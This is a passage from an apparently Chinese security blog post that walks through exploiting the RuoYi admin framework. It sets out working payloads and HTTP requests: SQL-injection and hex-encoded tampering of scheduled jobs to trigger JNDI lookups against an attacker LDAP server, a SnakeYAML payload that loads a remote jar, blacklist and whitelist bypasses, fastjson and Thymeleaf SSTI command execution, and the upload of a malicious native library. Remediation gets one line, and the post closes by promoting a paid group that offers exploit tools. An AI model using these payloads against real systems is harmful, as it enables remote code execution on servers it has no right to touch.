第二步： 修改执行命令  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'Hack By 1ue' WHERE job_id = 1;')
```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSPCbj9zP3m0LZkkkcBQ2Vek58xzUM4XdeZdOTibftKibtHd64jJbSrL6g/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
第三步：  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f646573657269616c4a61636b736f6e2729 WHERE job_id = 1;')
```  
  
创建任务  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSiaIkZFs9ZB2ambvLRLDLwXkz8L4l5iaPayE6A5eep6XK9d1Xylxh1kBg/640?wx_fmt=png&from=appmsg "")  
执行一次  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSD1owADtsmVYp20mtqySvsSjOq0ZqjqsMojQISbUFianXA1nZ75DhDNQ/640?wx_fmt=png&from=appmsg "")  
执行被修改的任务之前需要开启JNDI 需要下载cckuailong师傅的JNDI-Injection-Exploit-Plus项目(https://github.com/cckuailong/JNDI-Injection-Exploit-Plus/releases/tag/2.3)。 jdk版本要求1.8  
```
java -jar '.\JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar' -C calc -A 127.0.0.1
```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSTlZ57cz713k0GwrQkSBqll4jdIMR5x4VoEfzQozSPXAOfrdHatsBKA/640?wx_fmt=png&from=appmsg "")  
执行被修改的1任务 JNDI  
```
javax.naming.InitialContext.lookup('ldap://127.0.0.1:1389/deserialJackson')
```  
  
payload中可以执行反弹shell、漏洞探测、命令执行功能 DNSLOG  
```
javax.naming.InitialContext.lookup('ldap://dnslog')
```  
  
目标字符串不允许'ldap(s)'调用且不能存在括号，因此我们使用SQL注入加十六进制编码来进行绕过修改 https://www.bejson.com/convert/ox2str/  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSGmzlA6LSplibDVJv4mFwwsUXrS1fGPeqAOku74Fvjbu6IicOwwp99Tmw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
```
0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f7263793870732e646e736c6f672e636e2729genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f646573657269616c4a61636b736f6e2729 WHERE job_id = 1;')
```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSsDQYnCdkzqibfvicK88lcgicHzibpxU0oUaIehb8rnGdZVLiauYHHdxCcpw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
我们再来试试dnslog  
```
javax.naming.InitialContext.lookup('ldap://rcy8ps.dnslog.cn')
```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCS0qdxAWPIuXgGy1GPbQ75Rl1dJrnDsibh3eQetAgNYAoQE8X3iaAd512Q/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSCfeN2mX8tCibjAibcUWxuticc9NHEOspYNoPXAtTibB3ibQeicyVJBDziahyA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSSharWyKDlA28jaIfibzygsLaLf5o5rmmaLPEtFY5profBTSXBqoib6ag/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
工具使用： https://github.com/charonlight/RuoYiExploitGUI  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSp0etheSbcCPP9NXsl25T66G4lGUnBJTkyCRuNa2YN0mzLv7S4ePdKQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSmxibANcEpq9Bf9D5jyibaQibT9MmfJ2axmkdcs1fQCtNy1kQ3ScHnAiblQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCS0uVyvlCxyK7EjHrGlqpJL0UXicJoBUGhGOY0Y20zO8HRric7SA95Qs9Q/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## 0x06 修复方式  
  
1、升级版本。  
## 0x07 bypass  
### 版本4.6.2<=Ruoyi<4.7.2  
  
这个版本采用了黑名单限制调用字符串  
- 定时任务屏蔽ldap远程调用  
  
- 定时任务屏蔽http(s)远程调用  
  
- 定时任务屏蔽rmi远程调用  
  
**Bypass**  
咱们只需要在屏蔽的协议加上单引号,接着采用之前的方式例如:  
```
org.yaml.snakeyaml.Yaml.load(’!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“**h’t’t’p’:**//127.0.0.1:88/yaml-payload.jar”]]]]’)
```  
# 0x07 fastjson反序列化  
  
关注两个函数 parse 和 parseObject JSONObject.parse  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSNBM9WvW8PKO6JWiaePp1AGvHhuGaUJxniaQC4RjGcxiaKWqfomNOVsVww/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSuzWGTGicwt7AQ0xq5wt9AsW9lRRib6H2MPPYVOFRiaDJvGibfFtHiat33lQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSuIUrq1dohFLsmKl8hs5dh7tRacuvHywffk4LES1x0H8fW8SnOD2xkA/640?wx_fmt=png&from=appmsg "")  
开启 autotype  
```
params[@type]=org.apache.shiro.jndi.JndiObjectFactory&params[resourceName]=ldap://192.168.12.76:1389/09rlhv
```  
## ruoyi4.2.0  
  
初看这个数据包一堆参数，有点复杂，根据之前的分析梳理一下，需要的参数是 tplCategory  
为tree  
，才能走到fastjson漏洞点  
,认真梳理一下需要的参数，发现还需要treeCode&treeParentCode  
参数，这块代码中全局搜索提示的缺少的内容的中文名称即可发现参数名称，填写上即可。  
  
最终简化后的数据包如下  
```
POST /tool/gen/edit HTTP/1.1Host: 172.16.0.66User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36Referer: http://172.16.0.66/tool/gen/edit/6Cookie: JSESSIONID=c229803b-e147-4853-ae79-df7e04dcd338X-Requested-With: XMLHttpRequestAccept: application/json, text/javascript, */*; q=0.01Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://172.16.0.66Accept-Language: zh-CN,zh;q=0.9Content-Length: 3610tableName=111111&tableComment=111111&className=111111&functionAuthor=111111&&columns[0].javaType=Long&columns[0].javaField=infoId&&tplCategory=tree&treeCode=111111&treeParentCode=111111&packageName=111111&moduleName=111111&businessName=111111&functionName=111111&params[treeCode]=111111&params[treeParentCode]=1&params[treeName]={"@type":"java.net.Inet4Address","val":"11.hb4r0s.dnslog.cn"}
```  
# 0x08 SSTI模版注入漏洞  
#### 漏洞版本  
  
在4.7.1版本CacheController类中 ![[../S24-25赛季-大黑客之路/红队知识学习/assets/Y10 若依ruoyi/file-20250416135654610.png]]  
#### 漏洞复现  
  
模板注入漏洞payload：  
  
return内容可控：  
```
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc").getInputStream()).next()}::.x
```  
  
URL路径可控：  
```
${T(java.lang.Runtime).getRuntime().exec("touch test")}::.x
```  
  
测试上述payload发现返回包返回500，具体情况是Thymeleaf3.0.12  
版本对这个版本进行了一些先知，防止模板注入漏洞，https://github.com/thymeleaf/thymeleaf/issues/809  
以下为防护的情况：  
  
我们将Payload改造一下，如${T (java.lang.Runtime).getRuntime().exec("calc.exe")}  
。在T和(之间多加几个空格即可，放入数据包中进行测试发现成功弹出计算器。  
  
这里为了方便演示，payload  
直接贴出来了，大家测试的时候记得进行URL  
编码。  
```
POST /monitor/cache/getNames HTTP/1.1fragment=__${T%20(java.lang.Runtime).getRuntime().exec('open -a calculator')}__::.xcacheName=123&fragment=${T (java.lang.Runtime).getRuntime().exec(“calc.exe”)}
```  
#### 接口/monitor/cache/getKeys  
#### 接口/monitor/cache/getValue  
#### 接口/demo/form/localrefresh/task  
# 0x09 若依4.8.0版本计划任务RCE  
### 环境搭建  
  
https://github.com/yangzongzhuan/RuoYi/releases  
  
导入数据库，修改application-druid中的数据库账号密码  
  
修改application中的文件路径及log存放路径  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSRd9tXe5PyYrQ1fznbjRcsiapHgZuZAq8OhodYdicVKV90XLR6s6icd8EQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSW3DO2BEdI3shX2yt4ia7ia5RmUfG7KP0TG5ibvZFic4355eicEicfibwDS3fw/640?wx_fmt=png&from=appmsg "")  
启动成功  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSVzlicdWnVZSWMAlRGECHmDpudUUiaOaGITfWuhqZcWs8tnhGia2LWC8GA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## 漏洞分析  
  
最新版本4.8 Ruoyi 后台⽬前限制  
- **规则**  
：invokeTarget  
 必须包含 com.ruoyi.quartz.task  
 字符串。  
  
-   
- **子字符串匹配漏洞**  
：白名单检查使用 StringUtils.containsAnyIgnoreCase  
，只要 invokeTarget  
 中**任意位置**  
包含白名单字符串即可，无需完全匹配包名。  
  
- **构造畸形类名**  
：例如 xxx.com.ruoyi.quartz.task.yyy.EvilClass  
，虽然实际包名不在白名单内，但字符串包含 com.ruoyi.quartz.task  
，可绕过白名单。  
  
- 绕过思路  
  
：  
  
```
 /**       * 定时任务白名单配置（仅允许访问的包名，如其他需要可以自行添加）       */      public static final String[] JOB_WHITELIST_STR = { "com.ruoyi.quartz.task" };      /**       * 定时任务违规的字符       */      public static final String[] JOB_ERROR_STR = { "java.net.URL", "javax.naming.InitialContext", "org.yaml.snakeyaml",              "org.springframework", "org.apache", "com.ruoyi.common.utils.file", "com.ruoyi.common.config", "com.ruoyi.generator" };  }
```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSkdictStRFdGe8JbWxdCYzVgPCaqxiakKJrlx3Xjib5tq1JsG7MxZv4RMQ/640?wx_fmt=png&from=appmsg "")  
JOB_WHITELIST_STR 这个也就是com.ruoyi.quartz.task 其实不⽤类名 包含在⾃符串⾥⾯就⾏ 这⾥是invokeTarget⽽不是beanPackageName  
- **规则**  
：禁止使用 java.net.URL  
、org.springframework  
 等敏感包下的类。  
  
-   
- **寻找非黑名单类**  
：利用若依自身依赖或第三方库中未被黑名单覆盖的类。例如：  
  
- **工具类**  
：若依的 com.ruoyi.common.utils  
 下的某些工具类（需确认是否在 JOB_ERROR_STR  
 禁止的子包中）。  
  
- 绕过思路  
  
：  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSlrYSh9DGxGxzb8KKmJTooK284741uibhaUBwD8icBBXe78OQ4IwxKDRA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
**白名单检查（whiteList 方法）**  
```
public static boolean whiteList(String invokeTarget)      {          String packageName = StringUtils.substringBefore(invokeTarget, "(");          int count = StringUtils.countMatches(packageName, ".");          if (count > 1)          {              return StringUtils.containsAnyIgnoreCase(invokeTarget, Constants.JOB_WHITELIST_STR);          }          Object obj = SpringUtils.getBean(StringUtils.split(invokeTarget, ".")[0]);          String beanPackageName = obj.getClass().getPackage().getName();          return StringUtils.containsAnyIgnoreCase(beanPackageName, Constants.JOB_WHITELIST_STR)                  && !StringUtils.containsAnyIgnoreCase(beanPackageName, Constants.JOB_ERROR_STR);      }  }
```  
- **漏洞点**  
：当 invokeTarget  
 的包层级超过1层时（如 a.b.c.method  
），仅检查是否包含白名单字符串，而非完整包路径。  
  
然后不⽤JOB_ERROR_STR 这个类⾥⾯的 从mvn install 后 从其他包下⾯去寻找可利⽤的类下的⽅法就⾏  
  
需要满⾜以下条件**方法参数解析（getMethodParams）**  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSsdEMM35JDPtCJZ7tdicZMU53TxvTCEDm09UxIkkxMfsgxESjZVVk1UQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
```
public staticList<Object[]> getMethodParams(String invokeTarget)  {      String methodStr = StringUtils.substringBetween(invokeTarget, "(", ")");      if (StringUtils.isEmpty(methodStr))      {          returnnull;      }      String[] methodParams = methodStr.split(",(?=([^\"']*[\"'][^\"']*[\"'])*[^\"']*$)");      List<Object[]> classs = new LinkedList<>();      for (int i = 0; i < methodParams.length; i++)      {          String str = StringUtils.trimToEmpty(methodParams[i]);          // String字符串类型，以'或"开头          if (StringUtils.startsWithAny(str, "'", "\""))          {              classs.add(new Object[] { StringUtils.substring(str, 1, str.length() - 1), String.class });          }          // boolean布尔类型，等于true或者false          else if ("true".equalsIgnoreCase(str) || "false".equalsIgnoreCase(str))          {              classs.add(new Object[] { Boolean.valueOf(str), Boolean.class });          }          // long长整形，以L结尾          else if (StringUtils.endsWith(str, "L"))          {            classs.add(new Object[] { Long.valueOf(StringUtils.substring(str, 0, str.length() - 1)), Long.class });          }          // double浮点类型，以D结尾          else if (StringUtils.endsWith(str, "D"))          {              classs.add(new Object[] { Double.valueOf(StringUtils.substring(str, 0, str.length() - 1)), Double.class });          }          // 其他类型归类为整形          else          {              classs.add(new Object[] { Integer.valueOf(str), Integer.class });          }      }      return classs;  }
```  
- **限制**  
：参数类型被强制约束为基本类型，无法传递复杂对象。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSlk6GB6cJygtiaIvohLFSlYzT8RZS7rj41DrGZ4PZfNdricMKCiaWgdaXg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
```
/**   * 执行方法   *   * @param sysJob 系统任务   */  publicstatic void invokeMethod(SysJob sysJob) throws Exception{      String invokeTarget = sysJob.getInvokeTarget();      String beanName = getBeanName(invokeTarget);      String methodName = getMethodName(invokeTarget);      List<Object[]> methodParams = getMethodParams(invokeTarget);      if (!isValidClassName(beanName))      {          Object bean = SpringUtils.getBean(beanName);          invokeMethod(bean, methodName, methodParams);      }      else    {          Object bean = Class.forName(beanName).getDeclaredConstructor().newInstance();          invokeMethod(bean, methodName, methodParams);      }  }
```  
  
传递的参数只能是其中的这些类型 通过 , 进⾏分割。substringBetween获取的是() ⾥⾯ 不能继续包含 )了会截断  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSKV9YibOrCVQNTZjWAfNYGp4XQfblwJL4aBXtI9QsIMbVwYPb0dKx1gg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
```
public static String substringBetween(final String str, final String open, final String close) {      if (!ObjectUtils.allNotNull(str, open, close)) {          returnnull;      }      final int start = str.indexOf(open);      if (start != INDEX_NOT_FOUND) {          final int end = str.indexOf(close, start + open.length());          if (end != INDEX_NOT_FOUND) {              return str.substring(start + open.length(), end);          }      }      returnnull;  }
```  
  
那我们可以直接去找String 可控到sink 的类就可以了。  
  
这⾥反射的时候还需要注意 需要满⾜ 存在⼀个参构造 且都是public的  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSwlF5Ot2oicDwpW7achLV66Mys89fgNoYcpcSCria6k3bqicEsaYMHhlGw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
```
Object bean = Class.forName(beanName).getDeclaredConstructor().newInstance();
```  
#### 计划任务分析  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSuOAOVVia6BGC2zbBV8ISob6B0FlyMrEwfMatXAJT3qC8VLnVZO6VToA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
根据提交数据包锁定后端路由  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCS1TG0bmd5FjQyTt8v2whEfxO5KibxAuRfe6oc0baicstPDTguVjqtO9Bg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSPOlgQdca30MQQuBg4nFhv6Z3arIDeNW9ibHUHSAfTR3NSyJsZ5pzIVg/640?wx_fmt=png&from=appmsg "")  
调试看一下具体做了什么  
  
前几个都是在判断是否有包含rmi ldap http关键词,禁止对这些协议进行调用  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSz066gNpXsdfyCqXwQpbRkDgmzKLr4DQNGsGwEbSKytg3uibGlaqc1pg/640?wx_fmt=png&from=appmsg "")  
还判断了是否有一些黑名单中的类  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSvbM4jSv5EKib9Zol3kmQ4TibMz3wpzTG55icsIMBOUXZRIeic9XzibG5qSg/640?wx_fmt=png&from=appmsg "")  
进入白名单的判断  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSgAEbXaWemqqQ9qmW7ce7UHBDpyLbsdicgSLZmf7rmaMNNDIsWDs5icwA/640?wx_fmt=png&from=appmsg "")  
提取出调用的类名，判断其中是否包含白名单字符串  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSVowoTU15OTRSR78FUc5BhIb3SVJIt0M7E9uia3wicaI3c0kHnDE6WibIA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
白名单字符串为com.ruoyi.quartz.task  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSkqdVHBPN5xJZflib6g7Q0td40RvzTx3Ymicaia3dnMCCJGBEIlFHk8dmQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
注意这里是用正则去匹配的，所以该字符串在任意位置都可以，所以存在可以绕过的可能  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSkQs4jKOdclkrGl2FAUGw9iapiaKmjkica3nc0MbdKFBhtJHRCHR7KmSyQ/640?wx_fmt=png&from=appmsg "")  
后续就会进入正常的j保存计划任务流程  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSjuHWXibUGQibxxwDlNAjAqkxHmynna67zLYEYmTf0MLlIH0eDkibFcpTg/640?wx_fmt=png&from=appmsg "")  
当启动任务时，会调用方法  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSPrx56fxMZIPvULo3ia8KaZ2grzh90dEXGs3hMTp5fdx0icIRY3IMrBgg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
获取需要调用的类名方法名参数值  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSfsic09FJZ1RW6Hvr867j4Ow7kYlzuribicE96Qks0DMKnsR0xZePsmPcg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
在获取方法参数时进行了处理，只允许为字符串/布尔/长整/浮点/整形，无法传递类对象  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSYhvlPFJlQ8YmufWw2Dict3Py62ZrWSuFpfLs06JE35TgicsGCnFh0FzA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
接着会实例化该类，反射调用其方法  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSJguATVvl57UreqGia1SXziaThgF55PKOBnibibzlzHR0HzcoeDQ9Xqf8bw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
该方法为public修饰  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSsAbUTwTd7L4WPs8vJLCIZbO1hKKkKY5SPYnKCllVt4NxDHAQLkMybg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
我们想要利用需要达成的是  
- 使用的类不在黑名单中  
  
- 要存在com.ruoyi.quartz.task字符串  
  
- 不可以使用rmi ldap http协议  
  
#### 文件上传  
  
而在ruoyi中存在一个文件上传点  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSkZXvwE1t6qedYTTJFtHG3s7DYwWnGuIgR5DjRsEbHOOgaqeBhOyA7w/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
我们可以随便上传一个文件看看  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSorFCweUsWTUwFI5z4ibS0EPm8dQr0QoNIzwjdJgTsPZUbhVWgfpxJrw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSkoajEaeKafTyibVoEENria6CL21L09kQWiaUiabOnOz5bu2eLHibfvxKyWA/640?wx_fmt=png&from=appmsg "")  
那么我们可以上传一个名字包含com.ruoyi.quartz.task字符串的文件  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSMnj8YCHsicINBVa5B303ZFl3Wygf9fDDpwKlGKSpZ1Lu4BjeCGG6Nibw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## 漏洞复现  
  
在java中存在一种机制叫做JNI，可以通过加载外部链接库，从而执行其中的构造函数  
  
而com.sun.glass.utils.NativeLibLoader的loadLibrary方法就可以去加载链接库，也是public修饰  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSaicUZt3vH9pIAVBPCY6012k4fxMsTiabNG1fpWQKz135NXcfLDZqJMibw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
```
POST /common/upload HTTP/1.1Host: 10.40.107.67Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=b414f17a-7363-47d9-b164-3d0532a09b1cx-forwarded-for: 127.0.0.1Connection: closeContent-Type: multipart/form-data; boundary=00content0boundary00Content-Length: 167--00content0boundary00Content-Disposition: form-data; name="file"; filename="com.ruoyi.quartz.task.txt"Content-Type: image/jpgsuccess--00content0boundary00--
```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSCq9eLolibuWkibacm6dlDHfI7CnhHwljDR1ianpZxicpTR4YdKwUfQ4MIg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSsbChcyHnJZtIFPC6Qe1SZMSW6VJMnP3Bk2AFZY4kpDLic0DvEwPAfMw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
```
cat calc.c #include <stdlib.h>__attribute__((constructor))static void run() {system("open -a Calculator");}POST /common/upload HTTP/1.1Host: 10.40.107.67Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=b414f17a-7363-47d9-b164-3d0532a09b1cx-forwarded-for: 127.0.0.1Connection: closeContent-Type: multipart/form-data; boundary=00content0boundary00Content-Length: 167--00content0boundary00Content-Disposition: form-data; name="file"; filename="com.ruoyi.quartz.task.txt"Content-Type: image/jpg二进制恶意代码--00content0boundary00--
```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSYlpZ8RJIdBESca5DlUjBDPjLcWggfKo5h3qQ0QfsibBSDqP8wt8cHMg/640?wx_fmt=png&from=appmsg "")  
注意他会自动在后面添加dylib等后缀，在不同的系统中可能有不同的后缀，并且要注意架构问题  
## 知识星球  
  
**可以加入我们的知识星球，包含cs二开，甲壳虫，渗透工具，SRC案例分享，POC工具等，还有很多src挖掘资料包**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSqtUW8LZGL0Z5wMUPtV1R2fZia1ibgd9rbzFHkCCHvrSx8zdzymNU2ujg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSZ1zbE1796LtD1OCEXPPibdaBfsmlGiaeH7UIOQYIq0LbNZrQ8H69ZVkQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCS0PyP89Kvc5DZfjnt5BRsHtlKDGf6rerD4hW9djMib85kPD9c6aUHQjw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
